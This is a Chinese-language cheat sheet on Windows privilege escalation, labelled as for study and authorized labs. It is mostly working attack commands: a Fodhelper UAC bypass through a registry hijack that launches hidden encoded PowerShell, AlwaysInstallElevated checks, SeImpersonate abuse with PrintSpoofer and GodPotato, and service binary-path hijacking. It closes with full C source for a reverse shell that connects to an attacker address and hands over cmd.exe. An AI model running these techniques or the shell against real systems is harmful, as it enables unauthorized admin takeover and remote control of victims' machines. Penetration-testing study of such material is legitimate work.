# Windows 提权

::: warning 仅供学习 / 授权实验
先 `whoami /all` 再选路线。实验结束清理注册表和服务配置。
:::

```powershell
whoami /all
net localgroup administrators
```

| 看到 | 走 |
|---|---|
| Administrators + Medium 完整性 | UAC（Fodhelper） |
| `SeImpersonatePrivilege` | Potato 家族 |
| 能改服务映像 / `BINARY_PATH_NAME` | 服务劫持 |

## Fodhelper（未提升管理员）

前提：用户在本地 Administrators，`EnableLUA=1`，当前是 Medium。

```powershell
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c powershell -nop -w hidden -enc BASE64" /f
fodhelper.exe
:: 验证高完整性后立刻清：
reg delete "HKCU\Software\Classes\ms-settings" /f
```

备选宿主：`computerdefaults.exe`。`wsreset.exe` 只在部分旧 Win10 有效。

脚本化（lab）：

```powershell
$cmd = 'powershell -nop -w hidden -enc BASE64'
$p = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item $p -Force | Out-Null
New-ItemProperty $p -Name DelegateExecute -Value '' -Force | Out-Null
Set-ItemProperty $p -Name '(default)' -Value $cmd
Start-Process C:\Windows\System32\fodhelper.exe
Start-Sleep 5
Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
```

不是管理员组成员则整条无效。

## AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

两处都是 1 才有用。实验室用自定义 MSI（公开模板很多，自己编）。

## SeImpersonate

IIS 池、SQL 服务账户常见。工具从作者仓库取：PrintSpoofer、GodPotato、SigmaPotato。

```cmd
whoami /priv | findstr SeImpersonate
sc query spooler
PrintSpoofer.exe -c "cmd /c whoami > C:\Windows\Temp\who.txt"
:: 或
GodPotato.exe -cmd "cmd /c powershell -enc BASE64"
```

Spooler 停了换另一个 Potato，不要换特权判断。

## 服务劫持

```cmd
sc qc SERVICE
sc sdshow SERVICE
icacls "C:\path\to\service.exe"
```

```cmd
sc config SERVICE binpath= "C:\Windows\Temp\lab.exe"
sc stop SERVICE
sc start SERVICE
```

实验程序可用最小反向 shell（自己编译）。`sc start` 报 1053 时副作用可能已经发生。**先备份 `binpath` 和原文件，做完恢复。**

```c
/* 交叉编译：x86_64-w64-mingw32-gcc svc.c -o svc.exe -lws2_32 -DLHOST=\"10.10.14.5\" -DLPORT=4444 */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#ifndef LHOST
#define LHOST "127.0.0.1"
#endif
#ifndef LPORT
#define LPORT 4444
#endif
int main(void) {
    WSADATA w; SOCKET s; struct sockaddr_in a;
    STARTUPINFO si; PROCESS_INFORMATION pi;
    WSAStartup(MAKEWORD(2,2), &w);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    a.sin_family = AF_INET; a.sin_port = htons(LPORT);
    a.sin_addr.s_addr = inet_addr(LHOST);
    WSAConnect(s, (struct sockaddr*)&a, sizeof(a), 0, 0, 0, 0);
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    CreateProcess(NULL, "cmd.exe", 0, 0, TRUE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}
```
